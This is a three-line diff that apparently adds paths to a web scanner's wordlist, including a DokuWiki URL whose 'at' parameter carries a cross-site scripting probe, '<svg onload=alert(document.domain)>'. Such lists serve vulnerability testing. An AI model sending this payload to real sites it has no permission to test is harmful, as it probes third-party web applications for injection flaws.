@@ -1,0 +1,3 @@
+/install.php
+/doku.php
+/dokuwiki/doku.php?id=wiki:welcome&at=<svg%20onload=alert(document.domain)>
